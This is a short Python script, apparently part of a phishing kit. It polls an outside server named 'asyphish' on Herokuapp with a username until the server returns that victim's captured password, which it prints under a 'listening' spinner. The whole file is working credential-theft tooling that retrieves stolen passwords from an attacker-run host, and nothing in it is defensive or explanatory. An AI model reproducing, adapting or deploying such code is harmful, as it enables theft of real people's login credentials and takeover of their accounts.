import requests
import itertools
import threading
import time
import sys

class listen:
    def __init__(self, username):
        self.username = username
        self.done = False

    def animate(self):
        for c in itertools.cycle(['|','/', '-', '\\','/','-','\\']):
            if self.done:
                break
            sys.stdout.write('\rlistening ' + c)
            sys.stdout.flush()
            time.sleep(0.3)


    def getPassword(self):
        t = threading.Thread(target=self.animate)
        t.start()
            
        while True:
            password = requests.post("https://asyphish.herokuapp.com/ara", data={"name":self.username})
            time.sleep(0.5)
            if password.status_code == 500:
                pass
            else:
                print("\nPassword >>>",password.text)
                self.done = True
                break

